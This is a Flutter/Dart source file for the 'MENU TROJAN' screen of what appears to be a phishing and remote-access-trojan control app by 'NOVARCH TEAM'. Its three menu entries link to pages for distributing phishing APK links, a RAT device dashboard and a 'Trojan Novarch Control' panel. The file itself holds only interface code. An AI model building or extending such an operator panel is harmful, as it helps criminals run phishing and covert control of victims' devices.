// menu_tambahan.dart
// Menu Tambahan — hanya berisi: Tempat Phising, Device Dashboard, Controller
// Theme system menggunakan theme.dart (ThemeModeManager, AppColors, dll)
// + Sistem background/fallback seperti versi sebelumnya (tanpa chibi)
// + Mode tampilan: SCROLLING & SLIDER (card carousel) dengan toggle
// + Border menu lebih lebar

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import 'theme.dart';
import 'tempat_phis.dart';
import 'device_dashboard.dart';
// FIX: pakai alias agar tidak konflik nama AppColors dengan theme.dart
import 'devices_panel.dart' as devices_panel;

const String _lFont = 'Pek';
const String _lFontTitle = 'Deskripsi';

// ═════════════════════════════════════════════════════════════════════
//  MODE TAMPILAN
// ═════════════════════════════════════════════════════════════════════
enum _ViewMode { scrolling, slider }

// ═════════════════════════════════════════════════════════════════════
//  ASSET BACKGROUND (fallback seperti versi sebelumnya)
// ═════════════════════════════════════════════════════════════════════
class _A {
  static const bgFallback = 'assets/images/bg_anj.jpg';
  static const popupPaper = 'assets/images/popup.png';
}

// ═════════════════════════════════════════════════════════════════════
//  STRUKTUR MENU
// ═════════════════════════════════════════════════════════════════════
class _MenuEntry {
  const _MenuEntry({
    required this.title,
    required this.subtitle,
    required this.badge,
    required this.icon,
    required this.color1,
    required this.color2,
    required this.builder,
    this.comingSoon = false,
  });

  final String title;
  final String subtitle;
  final String badge;
  final IconData icon;
  final Color color1;
  final Color color2;
  final Widget Function() builder;
  final bool comingSoon;

  bool get isLocked => badge == 'LOCKED';
}

// ═════════════════════════════════════════════════════════════════════
//  MAIN PAGE
// ═════════════════════════════════════════════════════════════════════
class MenuTambahanPage extends StatefulWidget {
  const MenuTambahanPage({
    super.key,
    required this.username,
    required this.password,
    required this.role,
    required this.expiredDate,
    this.sessionKey = '',
  });

  final String username;
  final String password;
  final String role;
  final String expiredDate;
  final String sessionKey;

  @override
  State<MenuTambahanPage> createState() => _MenuTambahanPageState();
}

class _MenuTambahanPageState extends State<MenuTambahanPage>
    with TickerProviderStateMixin {
  late final AnimationController _scanCtrl;
  late final PageController _pageController;
  late final List<_MenuEntry> _menus;

  _ViewMode _viewMode = _ViewMode.scrolling;
  int _currentPage = 0;

  @override
  void initState() {
    super.initState();

    _scanCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 4),
    )..repeat();

    _pageController = PageController(viewportFraction: 0.82);

    _menus = [
      // ─── 1. TEMPAT PHISING ────────────────────────────────────────
      _MenuEntry(
        title: 'AMBIL PHISING',
        subtitle: 'Download & salin link APK phising',
        badge: 'OPEN',
        icon: Icons.link_rounded,
        color1: const Color(0xFFFF4D6A),
        color2: const Color(0xFF991B1B),
        builder: () => const TempatPhisPage(),
      ),

      // ─── 2. DEVICE DASHBOARD ──────────────────────────────────────
      _MenuEntry(
        title: 'RAT NOVARCH',
        subtitle: 'Novarch Remote',
        badge: 'OPEN',
        icon: Icons.devices_other_rounded,
        color1: const Color(0xFF22D3EE),
        color2: const Color(0xFF0E7490),
        builder: () => DeviceDashboardPage(
          username: widget.username,
          role: widget.role,
          sessionKey: widget.sessionKey,
        ),
      ),

      // ─── 3. DEVICES PANEL (ganti dari ControllerPage) ─────────────
      _MenuEntry(
        title: 'X.O NOVARCH',
        subtitle: 'Trojan Novarch Control',
        badge: 'OPEN',
        icon: Icons.settings_remote_rounded,
        color1: const Color(0xFFFFD166),
        color2: const Color(0xFFB45309),
        // FIX: dipanggil via alias agar tidak bentrok dengan AppColors theme.dart
        builder: () => devices_panel.DevicesPanelPage(
          username: widget.username,
          sessionKey: widget.sessionKey,
          role: widget.role,
          uid: '',
        ),
      ),
    ];
  }

  @override
  void dispose() {
    _scanCtrl.dispose();
    _pageController.dispose();
    super.dispose();
  }

  void _onMenuTap(_MenuEntry menu) {
    HapticFeedback.mediumImpact();

    if (menu.comingSoon) {
      _showComingSoon(menu);
      return;
    }

    Navigator.push(
      context,
      PageRouteBuilder(
        transitionDuration: const Duration(milliseconds: 450),
        pageBuilder: (_, __, ___) => menu.builder(),
        transitionsBuilder: (_, anim, __, child) {
          final curved = CurvedAnimation(
            parent: anim,
            curve: Curves.easeOutCubic,
          );
          return FadeTransition(
            opacity: curved,
            child: SlideTransition(
              position: Tween<Offset>(
                begin: const Offset(0.08, 0),
                end: Offset.zero,
              ).animate(curved),
              child: child,
            ),
          );
        },
      ),
    );
  }

  void _showComingSoon(_MenuEntry menu) {
    showGeneralDialog(
      context: context,
      barrierDismissible: true,
      barrierLabel: 'ComingSoon',
      barrierColor: Colors.black.withValues(alpha: 0.78),
      transitionDuration: const Duration(milliseconds: 400),
      pageBuilder: (_, __, ___) => const SizedBox.shrink(),
      transitionBuilder: (ctx, anim1, _, __) {
        final curve =
            CurvedAnimation(parent: anim1, curve: Curves.easeOutBack);
        return FadeTransition(
          opacity: anim1,
          child: ScaleTransition(
            scale: Tween<double>(begin: 0.85, end: 1.0).animate(curve),
            child: _ComingSoonPopup(
              menu: menu,
              onClose: () {
                if (ctx.mounted) Navigator.of(ctx).pop();
              },
            ),
          ),
        );
      },
    );
  }

  void _changeViewMode(_ViewMode mode) {
    if (mode == _viewMode) return;
    setState(() => _viewMode = mode);
  }

  @override
  Widget build(BuildContext context) {
    final isComic = ThemeModeManager.isComic3d;
    final ink = Theme.of(context).colorScheme.onSurface;
    final bg = Theme.of(context).scaffoldBackgroundColor;

    return AnnotatedRegion<SystemUiOverlayStyle>(
      value: SystemUiOverlayStyle(
        statusBarColor: Colors.transparent,
        statusBarBrightness:
            isComic ? Brightness.light : Brightness.dark,
        statusBarIconBrightness:
            isComic ? Brightness.dark : Brightness.light,
        systemNavigationBarColor: bg,
        systemNavigationBarIconBrightness:
            isComic ? Brightness.dark : Brightness.light,
      ),
      child: Scaffold(
        backgroundColor: bg,
        body: Stack(
          children: [
            // ─── 1. BACKGROUND FOTO (fallback asset) ────────────────
            Positioned.fill(
              child: Image.asset(
                _A.bgFallback,
                fit: BoxFit.cover,
                errorBuilder: (_, __, ___) => Container(color: bg),
              ),
            ),

            // ─── 2. GRADIENT OVERLAY (mengikuti theme) ──────────────
            Positioned.fill(child: _buildGradientOverlay()),

            // ─── 3. SCAN LINE OVERLAY (subtle) ──────────────────────
            Positioned.fill(
              child: IgnorePointer(
                child: AnimatedBuilder(
                  animation: _scanCtrl,
                  builder: (_, __) => CustomPaint(
                    painter: _ScanPainter(
                      progress: _scanCtrl.value,
                      color: AppColors.accent.withValues(alpha: 0.06),
                    ),
                  ),
                ),
              ),
            ),

            // ─── 4. KONTEN ──────────────────────────────────────────
            SafeArea(
              child: Column(
                children: [
                  _TopBar(
                    ink: ink,
                    onBack: () {
                      HapticFeedback.lightImpact();
                      Navigator.pop(context);
                    },
                  ),
                  const SizedBox(height: 12),

                  // ─── TOGGLE VIEW MODE ─────────────────────────────
                  _ViewToggle(
                    current: _viewMode,
                    onChanged: _changeViewMode,
                    ink: ink,
                  ),
                  const SizedBox(height: 12),

                  _InfoStrip(ink: ink),
                  const SizedBox(height: 16),

                  // ─── KONTEN SESUAI MODE ───────────────────────────
                  Expanded(
                    child: _viewMode == _ViewMode.slider
                        ? _buildSliderView(ink)
                        : _buildScrollView(ink),
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  VIEW: SCROLLING (VERTIKAL)
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildScrollView(Color ink) {
    return SingleChildScrollView(
      physics: const BouncingScrollPhysics(),
      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
      child: Column(
        children: [
          for (var i = 0; i < _menus.length; i++)
            Padding(
              padding: EdgeInsets.only(
                bottom: i < _menus.length - 1 ? 18 : 0,
              ),
              child: _HoloCard(
                menu: _menus[i],
                ink: ink,
                scanAnim: _scanCtrl,
                onTap: () => _onMenuTap(_menus[i]),
              ),
            ),
          const SizedBox(height: 24),
          Text(
            'NOVARCH TEAM • © 2026',
            style: TextStyle(
              fontFamily: _lFont,
              color: AppColors.textSub.withValues(alpha: 0.5),
              fontSize: 10,
              letterSpacing: 2,
            ),
          ),
          const SizedBox(height: 16),
        ],
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  VIEW: SLIDER (CARD CAROUSEL)
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildSliderView(Color ink) {
    return Column(
      children: [
        Expanded(
          child: PageView.builder(
            controller: _pageController,
            physics: const BouncingScrollPhysics(),
            onPageChanged: (i) => setState(() => _currentPage = i),
            itemCount: _menus.length,
            itemBuilder: (context, index) {
              return AnimatedBuilder(
                animation: _pageController,
                builder: (context, child) {
                  double scale = 1.0;
                  if (_pageController.position.haveDimensions) {
                    final page = _pageController.page! - index;
                    scale = (1 - page.abs() * 0.12).clamp(0.85, 1.0);
                  }
                  return Transform.scale(scale: scale, child: child);
                },
                child: Padding(
                  padding:
                      const EdgeInsets.symmetric(horizontal: 6, vertical: 6),
                  child: _HoloCard(
                    menu: _menus[index],
                    ink: ink,
                    scanAnim: _scanCtrl,
                    onTap: () => _onMenuTap(_menus[index]),
                    isCarousel: true,
                  ),
                ),
              );
            },
          ),
        ),
        const SizedBox(height: 16),
        _buildPageIndicator(),
        const SizedBox(height: 24),
      ],
    );
  }

  Widget _buildPageIndicator() {
    return Row(
      mainAxisAlignment: MainAxisAlignment.center,
      children: List.generate(_menus.length, (i) {
        final active = i == _currentPage;
        return AnimatedContainer(
          duration: const Duration(milliseconds: 250),
          curve: Curves.easeOutCubic,
          margin: const EdgeInsets.symmetric(horizontal: 4),
          width: active ? 26 : 8,
          height: 8,
          decoration: BoxDecoration(
            color: active
                ? AppColors.accent
                : AppColors.textSub.withValues(alpha: 0.3),
            borderRadius: BorderRadius.circular(4),
            boxShadow: active
                ? [
                    BoxShadow(
                      color: AppColors.accent.withValues(alpha: 0.55),
                      blurRadius: 10,
                    ),
                  ]
                : null,
          ),
        );
      }),
    );
  }

  // ═══════════════════════════════════════════════════════════════════
  //  GRADIENT OVERLAY (auto-adapt per theme mode)
  // ═══════════════════════════════════════════════════════════════════
  Widget _buildGradientOverlay() {
    if (ThemeModeManager.isComic3d) {
      // Mode komik: overlay putih transparan
      return Container(
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              AppColors.overlay40,
              AppColors.overlay60,
              AppColors.overlay40,
            ],
          ),
        ),
      );
    }
    // Mode normal & monochrome: overlay gelap
    return Container(
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [
            AppColors.bg.withValues(alpha: 0.55),
            AppColors.bg.withValues(alpha: 0.85),
            AppColors.bg.withValues(alpha: 0.55),
          ],
        ),
      ),
    );
  }
}

// ═════════════════════════════════════════════════════════════════════
//  VIEW TOGGLE (SCROLLING / SLIDER)
// ═════════════════════════════════════════════════════════════════════
class _ViewToggle extends StatelessWidget {
  const _ViewToggle({
    required this.current,
    required this.onChanged,
    required this.ink,
  });

  final _ViewMode current;
  final ValueChanged<_ViewMode> onChanged;
  final Color ink;

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Container(
        padding: const EdgeInsets.all(4),
        decoration: BoxDecoration(
          color: AppColors.card.withValues(alpha: 0.72),
          borderRadius: BorderRadius.circular(30),
          border: Border.all(
            color: AppColors.accent.withValues(alpha: 0.32),
            width: 1.6,
          ),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withValues(alpha: 0.25),
              blurRadius: 12,
              offset: const Offset(0, 4),
            ),
          ],
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            _item(
              mode: _ViewMode.scrolling,
              icon: Icons.view_list_rounded,
              label: 'SCROLLING',
            ),
            _item(
              mode: _ViewMode.slider,
              icon: Icons.view_carousel_rounded,
              label: 'SLIDER',
            ),
          ],
        ),
      ),
    );
  }

  Widget _item({
    required _ViewMode mode,
    required IconData icon,
    required String label,
  }) {
    final active = current == mode;
    return GestureDetector(
      onTap: () {
        HapticFeedback.selectionClick();
        onChanged(mode);
      },
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 250),
        curve: Curves.easeOutCubic,
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 9),
        decoration: BoxDecoration(
          gradient: active
              ? LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [AppColors.accent, AppColors.accentMid],
                )
              : null,
          borderRadius: BorderRadius.circular(26),
          boxShadow: active
              ? [
                  BoxShadow(
                    color: AppColors.accent.withValues(alpha: 0.45),
                    blurRadius: 12,
                    offset: const Offset(0, 3),
                  ),
                ]
              : null,
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(
              icon,
              size: 14,
              color:
                  active ? Colors.white : ink.withValues(alpha: 0.6),
            ),
            const SizedBox(width: 6),
            Text(
              label,
              style: TextStyle(
                fontFamily: _lFont,
                fontSize: 11,
                fontWeight: FontWeight.w800,
                letterSpacing: 1,
                color:
                    active ? Colors.white : ink.withValues(alpha: 0.6),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═════════════════════════════════════════════════════════════════════
//  TOP BAR
// ═════════════════════════════════════════════════════════════════════
class _TopBar extends StatelessWidget {
  const _TopBar({
    required this.ink,
    required this.onBack,
  });

  final Color ink;
  final VoidCallback onBack;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 12, 20, 0),
      child: Row(
        children: [
          Material(
            color: Colors.transparent,
            borderRadius: BorderRadius.circular(21),
            clipBehavior: Clip.antiAlias,
            child: InkWell(
              borderRadius: BorderRadius.circular(21),
              onTap: onBack,
              child: Container(
                width: 42,
                height: 42,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  border: Border.all(
                    color: AppColors.accent.withValues(alpha: 0.35),
                  ),
                ),
                child: Icon(
                  Icons.arrow_back_rounded,
                  color: ink,
                  size: 20,
                ),
              ),
            ),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                ShaderMask(
                  shaderCallback: (bounds) => LinearGradient(
                    colors: [AppColors.accent, AppColors.accentMid],
                  ).createShader(bounds),
                  child: Text(
                    'MENU TROJAN',
                    style: TextStyle(
                      fontFamily: _lFontTitle,
                      fontSize: 20,
                      fontWeight: FontWeight.w400,
                      letterSpacing: 2,
                      color: ThemeModeManager.isComic3d
                          ? AppColors.text
                          : Colors.white,
                    ),
                  ),
                ),
                const SizedBox(height: 2),
                Text(
                  'Fitur utama & eksperimental',
                  style: TextStyle(
                    fontFamily: _lFont,
                    color: ink.withValues(alpha: 0.7),
                    fontSize: 11,
                  ),
                ),
              ],
            ),
          ),
          _SoonBadge(),
        ],
      ),
    );
  }
}

class _SoonBadge extends StatelessWidget {
  const _SoonBadge();

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        color: AppColors.accent.withValues(alpha: 0.12),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(
          color: AppColors.accent.withValues(alpha: 0.3),
        ),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 6,
            height: 6,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: AppColors.accent,
              boxShadow: [
                BoxShadow(color: AppColors.accent, blurRadius: 6),
              ],
            ),
          ),
          const SizedBox(width: 6),
          Text(
            'NEW',
            style: TextStyle(
              fontFamily: _lFont,
              color: AppColors.accent,
              fontSize: 11,
              fontWeight: FontWeight.w800,
              letterSpacing: 1,
            ),
          ),
        ],
      ),
    );
  }
}

// ═════════════════════════════════════════════════════════════════════
//  INFO STRIP
// ═════════════════════════════════════════════════════════════════════
class _InfoStrip extends StatelessWidget {
  const _InfoStrip({required this.ink});

  final Color ink;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 20),
      child: Container(
        padding: const EdgeInsets.symmetric(
          horizontal: 14,
          vertical: 10,
        ),
        decoration: BoxDecoration(
          color: AppColors.card.withValues(alpha: 0.7),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: AppColors.border.withValues(alpha: 0.6),
          ),
        ),
        child: Row(
          children: [
            Icon(
              Icons.hourglass_empty_rounded,
              color: AppColors.accent,
              size: 16,
            ),
            const SizedBox(width: 10),
            Expanded(
              child: Text(
                'Semua fitur aktif — gunakan dengan bijak',
                style: TextStyle(
                  fontFamily: _lFont,
                  color: ink.withValues(alpha: 0.75),
                  fontSize: 11.5,
                  fontWeight: FontWeight.w600,
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}

// ═════════════════════════════════════════════════════════════════════
//  HOLO CARD
//  Mendukung 2 layout: horizontal (scrolling) & vertikal (carousel)
// ═════════════════════════════════════════════════════════════════════
class _HoloCard extends StatelessWidget {
  const _HoloCard({
    required this.menu,
    required this.ink,
    required this.scanAnim,
    required this.onTap,
    this.isCarousel = false,
  });

  final _MenuEntry menu;
  final Color ink;
  final Animation<double> scanAnim;
  final VoidCallback onTap;
  final bool isCarousel;

  @override
  Widget build(BuildContext context) {
    final is3D = ThemeModeManager.isComic3d;
    final radius = BorderRadius.circular(is3D ? 6 : 22);
    // ─── BORDER LEBIH LEBAR ──────────────────────────────────────
    final borderWidth = is3D ? 4.5 : 3.0;

    return GestureDetector(
      onTap: onTap,
      child: Container(
        width: isCarousel ? double.infinity : null,
        height: isCarousel ? double.infinity : null,
        decoration: BoxDecoration(
          borderRadius: radius,
          gradient: is3D
              ? null
              : LinearGradient(
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                  colors: [
                    menu.color2.withValues(alpha: 0.9),
                    menu.color1.withValues(alpha: 0.55),
                    menu.color2.withValues(alpha: 0.85),
                  ],
                  stops: const [0.0, 0.5, 1.0],
                ),
          color: is3D ? Colors.white : null,
          border: Border.all(
            color: is3D ? ink : menu.color1.withValues(alpha: 0.75),
            width: borderWidth,
          ),
          boxShadow: is3D
              ? [
                  BoxShadow(
                    color: ink,
                    offset: const Offset(4, 4),
                    blurRadius: 0,
                  ),
                ]
              : [
                  BoxShadow(
                    color: menu.color1.withValues(alpha: 0.35),
                    blurRadius: 26,
                    spreadRadius: 1,
                    offset: const Offset(0, 10),
                  ),
                ],
        ),
        child: ClipRRect(
          borderRadius: radius,
          child: Stack(
            children: [
              _buildGlow(),
              _buildScanLine(),
              isCarousel ? _buildCarouselContent() : _buildContent(),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildGlow() {
    final size = isCarousel ? 220.0 : 140.0;
    final offset = isCarousel ? -60.0 : -30.0;
    return Positioned(
      top: offset,
      right: offset,
      child: Container(
        width: size,
        height: size,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: RadialGradient(
            colors: [
              menu.color1.withValues(alpha: 0.45),
              Colors.transparent,
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildScanLine() {
    final travel = isCarousel ? 600.0 : 200.0;
    final bandHeight = isCarousel ? 60.0 : 30.0;
    return AnimatedBuilder(
      animation: scanAnim,
      builder: (_, __) => Positioned(
        top: -40 + (scanAnim.value * travel),
        left: 0,
        right: 0,
        child: IgnorePointer(
          child: Container(
            height: bandHeight,
            decoration: BoxDecoration(
              gradient: LinearGradient(
                begin: Alignment.topCenter,
                end: Alignment.bottomCenter,
                colors: [
                  Colors.white.withValues(alpha: 0.0),
                  Colors.white.withValues(alpha: 0.08),
                  Colors.white.withValues(alpha: 0.0),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  // ─── LAYOUT HORIZONTAL (SCROLLING) ─────────────────────────────
  Widget _buildContent() {
    return Padding(
      padding: const EdgeInsets.all(18),
      child: Row(
        children: [
          _buildIcon(),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    _Badge(
                      text: menu.badge,
                      color: menu.isLocked
                          ? menu.color1
                          : const Color(0xFF22C55E),
                    ),
                    const SizedBox(width: 8),
                    Icon(
                      menu.isLocked
                          ? Icons.lock_rounded
                          : Icons.check_circle_rounded,
                      color: Colors.white.withValues(alpha: 0.65),
                      size: 12,
                    ),
                  ],
                ),
                const SizedBox(height: 10),
                _buildTitle(),
                const SizedBox(height: 4),
                _buildSubtitle(),
              ],
            ),
          ),
          Icon(
            Icons.arrow_forward_ios_rounded,
            color: Colors.white.withValues(alpha: 0.7),
            size: 16,
          ),
        ],
      ),
    );
  }

  // ─── LAYOUT VERTIKAL (CAROUSEL) ────────────────────────────────
  Widget _buildCarouselContent() {
    return Padding(
      padding: const EdgeInsets.all(26),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              _Badge(
                text: menu.badge,
                color: menu.isLocked
                    ? menu.color1
                    : const Color(0xFF22C55E),
              ),
              const SizedBox(width: 8),
              Icon(
                menu.isLocked
                    ? Icons.lock_rounded
                    : Icons.check_circle_rounded,
                color: Colors.white.withValues(alpha: 0.7),
                size: 14,
              ),
            ],
          ),
          const Spacer(),
          Center(child: _buildIcon(big: true)),
          const Spacer(),
          _buildTitle(big: true),
          const SizedBox(height: 8),
          _buildSubtitle(big: true),
          const SizedBox(height: 22),
          Container(
            padding: const EdgeInsets.symmetric(
              horizontal: 16,
              vertical: 12,
            ),
            decoration: BoxDecoration(
              color: Colors.white.withValues(alpha: 0.12),
              borderRadius: BorderRadius.circular(14),
              border: Border.all(
                color: Colors.white.withValues(alpha: 0.3),
                width: 1.4,
              ),
            ),
            child: Row(
              children: [
                Text(
                  'TAP UNTUK BUKA',
                  style: TextStyle(
                    color: Colors.white.withValues(alpha: 0.9),
                    fontSize: 11,
                    fontWeight: FontWeight.w800,
                    letterSpacing: 1.5,
                    fontFamily: _lFont,
                  ),
                ),
                const Spacer(),
                Icon(
                  Icons.arrow_forward_rounded,
                  color: Colors.white.withValues(alpha: 0.95),
                  size: 18,
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildIcon({bool big = false}) {
    final size = big ? 110.0 : 68.0;
    final iconSize = big ? 48.0 : 30.0;
    return Container(
      width: size,
      height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        gradient: RadialGradient(
          colors: [
            Colors.white.withValues(alpha: 0.25),
            Colors.white.withValues(alpha: 0.05),
          ],
        ),
        border: Border.all(
          color: Colors.white.withValues(alpha: 0.5),
          width: 1.5,
        ),
        boxShadow: [
          BoxShadow(
            color: menu.color1.withValues(alpha: 0.6),
            blurRadius: 20,
            spreadRadius: 2,
          ),
        ],
      ),
      child: Icon(
        menu.icon,
        color: Colors.white,
        size: iconSize,
        shadows: [
          Shadow(
            color: Colors.black.withValues(alpha: 0.5),
            blurRadius: 8,
            offset: const Offset(0, 2),
          ),
        ],
      ),
    );
  }

  Widget _buildTitle({bool big = false}) {
    return Text(
      menu.title,
      maxLines: big ? 2 : 1,
      overflow: TextOverflow.ellipsis,
      style: TextStyle(
        color: Colors.white,
        fontSize: big ? 22 : 15,
        fontWeight: FontWeight.w900,
        letterSpacing: big ? 1.5 : 1.2,
        fontFamily: _lFont,
        shadows: [
          Shadow(
            color: Colors.black.withValues(alpha: 0.6),
            blurRadius: 8,
            offset: const Offset(0, 2),
          ),
        ],
      ),
    );
  }

  Widget _buildSubtitle({bool big = false}) {
    return Text(
      menu.subtitle,
      maxLines: big ? 2 : 1,
      overflow: TextOverflow.ellipsis,
      style: TextStyle(
        color: Colors.white.withValues(alpha: big ? 0.8 : 0.75),
        fontSize: big ? 13 : 11,
        fontWeight: FontWeight.w500,
        fontFamily: _lFont,
        height: big ? 1.4 : null,
      ),
    );
  }
}

// ═════════════════════════════════════════════════════════════════════
//  BADGE
// ═════════════════════════════════════════════════════════════════════
class _Badge extends StatelessWidget {
  const _Badge({required this.text, required this.color});

  final String text;
  final Color color;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
      decoration: BoxDecoration(
        color: Colors.black.withValues(alpha: 0.35),
        borderRadius: BorderRadius.circular(30),
        border: Border.all(
          color: Colors.white.withValues(alpha: 0.35),
          width: 1,
        ),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 5,
            height: 5,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: color,
              boxShadow: [BoxShadow(color: color, blurRadius: 6)],
            ),
          ),
          const SizedBox(width: 5),
          Text(
            text,
            style: const TextStyle(
              color: Colors.white,
              fontSize: 9,
              fontWeight: FontWeight.w800,
              letterSpacing: 1.4,
              fontFamily: _lFont,
            ),
          ),
        ],
      ),
    );
  }
}

// ═════════════════════════════════════════════════════════════════════
//  COMING SOON POPUP (dengan paper background, TANPA chibi)
// ═════════════════════════════════════════════════════════════════════
class _ComingSoonPopup extends StatelessWidget {
  const _ComingSoonPopup({
    required this.menu,
    required this.onClose,
  });

  final _MenuEntry menu;
  final VoidCallback onClose;

  @override
  Widget build(BuildContext context) {
    return Center(
      child: Material(
        color: Colors.transparent,
        child: Container(
          width: MediaQuery.of(context).size.width * 0.88,
          constraints: const BoxConstraints(
            maxWidth: 400,
            maxHeight: 560,
          ),
          child: Stack(
            clipBehavior: Clip.none,
            children: [
              // ─── PAPER BACKGROUND ──────────────────────────────────
              Positioned.fill(
                child: Image.asset(
                  _A.popupPaper,
                  fit: BoxFit.fill,
                  errorBuilder: (_, __, ___) => Container(
                    decoration: BoxDecoration(
                      color: Colors.white,
                      borderRadius: BorderRadius.circular(24),
                      border: Border.all(color: Colors.black, width: 2),
                    ),
                  ),
                ),
              ),
              // ─── KONTEN POPUP ──────────────────────────────────────
              Padding(
                padding: const EdgeInsets.fromLTRB(30, 48, 30, 50),
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    _buildIcon(),
                    const SizedBox(height: 20),
                    const Text(
                      'SEGERA HADIR',
                      textAlign: TextAlign.center,
                      style: TextStyle(
                        color: Color(0xFF1A1A1A),
                        fontSize: 18,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 1.3,
                        fontFamily: _lFont,
                      ),
                    ),
                    const SizedBox(height: 12),
                    _buildMessage(),
                    const SizedBox(height: 26),
                    _buildButton(),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildIcon() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: menu.color1,
        shape: BoxShape.circle,
        boxShadow: const [
          BoxShadow(
            color: Colors.black12,
            blurRadius: 8,
            offset: Offset(0, 4),
          ),
        ],
      ),
      child: Icon(
        menu.icon,
        color: Colors.white,
        size: 28,
      ),
    );
  }

  Widget _buildMessage() {
    return Text(
      'Fitur ${menu.title} masih dalam tahap pengembangan.\n\n'
      'Tunggu update berikutnya ya!',
      textAlign: TextAlign.center,
      style: const TextStyle(
        color: Color(0xFF666666),
        fontSize: 12.5,
        height: 1.5,
        fontFamily: _lFont,
      ),
    );
  }

  Widget _buildButton() {
    return SizedBox(
      width: 200,
      height: 42,
      child: Material(
        color: menu.color1,
        borderRadius: BorderRadius.circular(30),
        clipBehavior: Clip.antiAlias,
        child: InkWell(
          onTap: () {
            HapticFeedback.mediumImpact();
            onClose();
          },
          child: Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(30),
              boxShadow: [
                BoxShadow(
                  color: menu.color1.withValues(alpha: 0.4),
                  blurRadius: 10,
                  offset: const Offset(0, 4),
                ),
              ],
            ),
            child: const Center(
              child: Text(
                'MENGERTI',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 12,
                  fontWeight: FontWeight.w800,
                  letterSpacing: 2,
                  fontFamily: _lFont,
                ),
              ),
            ),
          ),
        ),
      ),
    );
  }
}

// ═════════════════════════════════════════════════════════════════════
//  SCAN PAINTER (garis scan bergerak)
// ═════════════════════════════════════════════════════════════════════
class _ScanPainter extends CustomPainter {
  _ScanPainter({required this.progress, required this.color});

  final double progress;
  final Color color;

  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = color
      ..strokeWidth = 1;

    const spacing = 40.0;
    final yOffset = progress * spacing;

    for (var y = -spacing + yOffset; y < size.height; y += spacing) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), paint);
    }
  }

  @override
  bool shouldRepaint(covariant _ScanPainter old) =>
      old.progress != progress;
}